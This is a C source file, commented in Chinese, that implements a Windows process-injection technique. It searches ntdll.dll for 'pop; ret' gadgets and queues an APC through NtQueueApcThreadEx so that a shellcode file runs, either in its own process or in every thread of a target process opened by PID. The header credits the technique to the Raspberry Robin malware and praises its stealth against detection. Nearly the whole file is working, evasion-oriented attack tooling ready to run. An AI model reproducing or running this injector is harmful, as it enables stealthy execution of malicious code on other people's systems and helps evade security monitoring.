/*
 * NtQueueApcThreadEx NTDLL Gadget Injection
 *
 * 核心原理：
 * 1. 在 ntdll.dll 的可执行节中搜索 "pop r32; ret" gadget
 * 2. 使用 NtQueueApcThreadEx 注入，ApcRoutine 指向 gadget（合法地址）
 * 3. Gadget 执行后返回到 SystemArgument1（shellcode）
 *
 * 执行流程：
 * NtQueueApcThreadEx(ApcRoutine = ntdll!<pop r32; ret>, SystemArgument1 = shellcode)
 *   ↓
 * 线程进入 alertable 状态
 *   ↓
 * APC 调度，跳转到 gadget
 *   ↓
 * 执行 pop r32（弹出栈上参数）
 *   ↓
 * 执行 ret（返回到 SystemArgument1 = shellcode）
 *   ↓
 * Shellcode 执行
 *
 * 与传统 APC 注入的区别：
 * - 传统 APC：ApcRoutine 直接指向 shellcode（可疑）
 * - Gadget APC：ApcRoutine 指向 ntdll.dll 中的 gadget（合法）
 *
 * 优势：
 * - ApcRoutine 指向 ntdll.dll 合法地址，难以检测
 * - 数百个 gadget 可供选择，随机化增强隐蔽性
 * - 利用 ROP 风格，无直接跳转到 shellcode
 *
 * 来源：
 * - Raspberry Robin 恶意软件首次使用
 * - Avast 分析报告：https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/
 *
 * 参考：
 * - https://github.com/LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection
 */

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

#define MAX_GADGETS 2048

// NtQueueApcThreadEx 函数指针（Windows 7+）
typedef NTSTATUS(NTAPI* pNtQueueApcThreadEx)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

// NtTestAlert 函数指针
typedef NTSTATUS(NTAPI* pNtTestAlert)(VOID);

// 检查地址是否为有效的 pop r32; ret gadget
// 模式：5X C3（pop r32; ret），排除 5C（pop esp）
BOOL IsValidGadget(PBYTE address) {
    // 检查第一个字节：5X（pop r32/r64）
    // (*address & 0xF0) == 0x50 检查高 4 位是否为 5
    // *address != 0x5C 排除 pop esp/rsp（会破坏栈）
    // *(address + 1) == 0xC3 检查下一个字节是否为 ret
    //
    // 这个pattern在x86和x64下都有效
    return (*address != 0x5C && (*address & 0xF0) == 0x50) && *(address + 1) == 0xC3;
}

// 在指定模块中查找随机 pop r32; ret gadget
LPVOID FindRandomGadget(HANDLE hProcess, const wchar_t* moduleName) {
    // 获取模块句柄
    HMODULE hModule = GetModuleHandleW(moduleName);
    if (!hModule) {
        printf("[-] Failed to get module handle for %ws (%u)\n", moduleName, GetLastError());
        return NULL;
    }

    printf("[+] Module %ws base address: %p\n", moduleName, hModule);

    // 获取模块信息
    MODULEINFO moduleInfo;
    if (!GetModuleInformation(hProcess, hModule, &moduleInfo, sizeof(moduleInfo))) {
        printf("[-] Failed to get module information (%u)\n", GetLastError());
        return NULL;
    }

    printf("[+] Module size: %u bytes\n", moduleInfo.SizeOfImage);

    // 解析 PE 头
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)moduleInfo.lpBaseOfDll + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature\n");
        return NULL;
    }

    // 存储找到的 gadget
    LPVOID gadgets[MAX_GADGETS];
    ZeroMemory(gadgets, sizeof(gadgets));
    DWORD gadgetCount = 0;

    printf("[+] Searching for gadgets in executable sections...\n");

    // 遍历所有节
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(
            (PBYTE)IMAGE_FIRST_SECTION(ntHeaders) + (IMAGE_SIZEOF_SECTION_HEADER * i)
        );

        // 只搜索可执行代码节
        if ((sectionHeader->Characteristics & IMAGE_SCN_CNT_CODE) &&
            (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {

            char sectionName[9] = {0};
            memcpy(sectionName, sectionHeader->Name, 8);
            printf("[+] Scanning section: %s\n", sectionName);

            LPBYTE sectionBase = (LPBYTE)moduleInfo.lpBaseOfDll + sectionHeader->VirtualAddress;
            LPBYTE sectionEnd = sectionBase + sectionHeader->Misc.VirtualSize;

            // 扫描节中的每个字节
            for (PBYTE currentAddr = sectionBase; currentAddr < (sectionEnd - 1); currentAddr++) {
                if (IsValidGadget(currentAddr)) {
                    gadgets[gadgetCount++] = currentAddr;

                    if (gadgetCount >= MAX_GADGETS) {
                        printf("[+] Found maximum gadgets (%d), stopping search\n", MAX_GADGETS);
                        goto done;
                    }
                }
            }
        }
    }

done:
    if (gadgetCount == 0) {
        printf("[-] No gadgets found\n");
        return NULL;
    }

    printf("[+] Found %u gadgets\n", gadgetCount);

    // 随机选择一个 gadget
    srand((unsigned)time(NULL));
    DWORD randomIndex = rand() % gadgetCount;
    LPVOID selectedGadget = gadgets[randomIndex];

    printf("[+] Selected random gadget at %ws!%p (index %u/%u)\n",
           moduleName, selectedGadget, randomIndex, gadgetCount);

    // 打印 gadget 字节
    PBYTE gadgetBytes = (PBYTE)selectedGadget;
    printf("[+] Gadget bytes: %02X %02X (", gadgetBytes[0], gadgetBytes[1]);

    // 解析 pop 指令
    switch (gadgetBytes[0]) {
        case 0x50: printf("pop eax/rax"); break;
        case 0x51: printf("pop ecx/rcx"); break;
        case 0x52: printf("pop edx/rdx"); break;
        case 0x53: printf("pop ebx/rbx"); break;
        case 0x55: printf("pop ebp/rbp"); break;
        case 0x56: printf("pop esi/rsi"); break;
        case 0x57: printf("pop edi/rdi"); break;
        case 0x58: printf("pop r8"); break;
        case 0x59: printf("pop r9"); break;
        case 0x5A: printf("pop r10"); break;
        case 0x5B: printf("pop r11"); break;
        case 0x5D: printf("pop r13"); break;
        case 0x5E: printf("pop r14"); break;
        case 0x5F: printf("pop r15"); break;
        default: printf("pop r??"); break;
    }
    printf("; ret)\n");

    return selectedGadget;
}

// 本地 Gadget APC 注入
BOOL LocalGadgetApcInjection(LPVOID shellcode, SIZE_T shellcodeSize) {
    printf("\n[+] Local Gadget APC Injection\n");
    printf("[+] Shellcode address: %p\n", shellcode);
    printf("[+] Shellcode size: %zu bytes\n\n", shellcodeSize);

    // 获取 NtQueueApcThreadEx
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll.dll handle\n");
        return FALSE;
    }

    pNtQueueApcThreadEx NtQueueApcThreadEx = (pNtQueueApcThreadEx)GetProcAddress(hNtdll, "NtQueueApcThreadEx");
    if (!NtQueueApcThreadEx) {
        printf("[-] NtQueueApcThreadEx not found (Windows 7+ required)\n");
        return FALSE;
    }

    pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");
    if (!NtTestAlert) {
        printf("[-] NtTestAlert not found\n");
        return FALSE;
    }

    printf("[+] NtQueueApcThreadEx: %p\n", NtQueueApcThreadEx);
    printf("[+] NtTestAlert: %p\n\n", NtTestAlert);

    // 查找 gadget
    LPVOID gadget = FindRandomGadget(GetCurrentProcess(), L"ntdll.dll");
    if (!gadget) {
        printf("[-] Failed to find gadget\n");
        return FALSE;
    }

    printf("\n[+] Queueing APC with gadget...\n");
    printf("[+] ApcRoutine = %p (ntdll.dll gadget)\n", gadget);
    printf("[+] SystemArgument1 = %p (shellcode)\n\n", shellcode);

    // 调用 NtQueueApcThreadEx
    NTSTATUS status = NtQueueApcThreadEx(
        GetCurrentThread(),  // 目标线程
        NULL,                // UserApcReserveHandle
        gadget,              // ApcRoutine = gadget (合法地址)
        shellcode,           // SystemArgument1 = shellcode
        NULL,                // SystemArgument2
        NULL                 // SystemArgument3
    );

    if (status != 0) {
        printf("[-] NtQueueApcThreadEx failed with status 0x%X\n", status);
        return FALSE;
    }

    printf("[+] NtQueueApcThreadEx succeeded\n");
    printf("[+] Calling NtTestAlert to trigger APC...\n\n");

    // 触发 APC
    // 注意：NtTestAlert会触发shellcode执行，某些shellcode在执行完毕后
    // 可能不会正确返回，这会导致程序崩溃。这是正常现象。
    // 我们在触发后立即退出进程以避免崩溃。
    NtTestAlert();

    // 如果shellcode正确返回，我们会到达这里
    printf("[+] Shellcode executed successfully\n");

    return TRUE;
}

// 远程 Gadget APC 注入
BOOL RemoteGadgetApcInjection(DWORD pid, LPVOID shellcode, SIZE_T shellcodeSize) {
    printf("\n[+] Remote Gadget APC Injection\n");
    printf("[+] Target PID: %u\n", pid);
    printf("[+] Shellcode size: %zu bytes\n\n", shellcodeSize);

    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process %u (%u)\n", pid, GetLastError());
        return FALSE;
    }

    printf("[+] Opened target process\n");

    // 分配远程内存
    LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        printf("[-] Failed to allocate remote memory (%u)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Allocated remote memory at %p\n", remoteShellcode);

    // 写入 shellcode
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        printf("[-] Failed to write shellcode (%u)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Wrote shellcode to remote process\n");

    // 查找 gadget（在本地进程中查找，因为 ntdll.dll 基址相同）
    LPVOID gadget = FindRandomGadget(GetCurrentProcess(), L"ntdll.dll");
    if (!gadget) {
        printf("[-] Failed to find gadget\n");
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 枚举目标进程的所有线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create thread snapshot (%u)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 获取 NtQueueApcThreadEx
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueueApcThreadEx NtQueueApcThreadEx = (pNtQueueApcThreadEx)GetProcAddress(hNtdll, "NtQueueApcThreadEx");
    if (!NtQueueApcThreadEx) {
        printf("[-] NtQueueApcThreadEx not found\n");
        CloseHandle(hSnapshot);
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    printf("\n[+] Enumerating threads...\n");

    if (!Thread32First(hSnapshot, &te32)) {
        printf("[-] Failed to enumerate threads (%u)\n", GetLastError());
        CloseHandle(hSnapshot);
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    DWORD apcCount = 0;
    do {
        if (te32.th32OwnerProcessID == pid) {
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
            if (hThread) {
                printf("[+] Queueing APC to thread %u\n", te32.th32ThreadID);

                NTSTATUS status = NtQueueApcThreadEx(
                    hThread,          // 目标线程
                    NULL,             // UserApcReserveHandle
                    gadget,           // ApcRoutine = gadget
                    remoteShellcode,  // SystemArgument1 = shellcode
                    NULL,             // SystemArgument2
                    NULL              // SystemArgument3
                );

                if (status == 0) {
                    apcCount++;
                }

                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);
    CloseHandle(hProcess);

    printf("\n[+] Queued APCs to %u threads\n", apcCount);
    printf("[+] Waiting for thread to enter alertable state...\n");

    return apcCount > 0;
}

int main(int argc, char* argv[]) {
    printf("[+] NtQueueApcThreadEx NTDLL Gadget Injection\n");
    printf("[+] LloydLabs Technique\n\n");

    if (argc < 3) {
        printf("Usage:\n");
        printf("  Local injection:  %s local <shellcode.bin>\n", argv[0]);
        printf("  Remote injection: %s remote <PID> <shellcode.bin>\n\n", argv[0]);
        printf("Example:\n");
        printf("  %s local calc_shellcode.bin\n", argv[0]);
        printf("  %s remote 1234 calc_shellcode.bin\n\n", argv[0]);
        return 0;
    }

    const char* mode = argv[1];
    const char* shellcodePath = (strcmp(mode, "local") == 0) ? argv[2] : argv[3];

    // 读取 shellcode
    HANDLE hFile = CreateFileA(shellcodePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open shellcode file (%u)\n", GetLastError());
        return -1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID shellcode = malloc(fileSize);
    DWORD bytesRead;

    if (!ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL)) {
        printf("[-] Failed to read shellcode (%u)\n", GetLastError());
        CloseHandle(hFile);
        free(shellcode);
        return -1;
    }

    CloseHandle(hFile);

    printf("[+] Loaded shellcode: %u bytes\n", fileSize);

    BOOL result = FALSE;

    if (strcmp(mode, "local") == 0) {
        // 本地注入：分配可执行内存
        LPVOID localShellcode = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!localShellcode) {
            printf("[-] Failed to allocate local memory (%u)\n", GetLastError());
            free(shellcode);
            return -1;
        }

        memcpy(localShellcode, shellcode, fileSize);
        result = LocalGadgetApcInjection(localShellcode, fileSize);

        if (result) {
            printf("[+] Local injection successful!\n");
        }

        VirtualFree(localShellcode, 0, MEM_RELEASE);
    }
    else if (strcmp(mode, "remote") == 0) {
        if (argc < 4) {
            printf("[-] Missing PID argument\n");
            free(shellcode);
            return -1;
        }

        DWORD pid = atoi(argv[2]);
        result = RemoteGadgetApcInjection(pid, shellcode, fileSize);

        if (result) {
            printf("[+] Remote injection successful!\n");
        }
    }
    else {
        printf("[-] Invalid mode: %s\n", mode);
    }

    free(shellcode);

    return result ? 0 : -1;
}
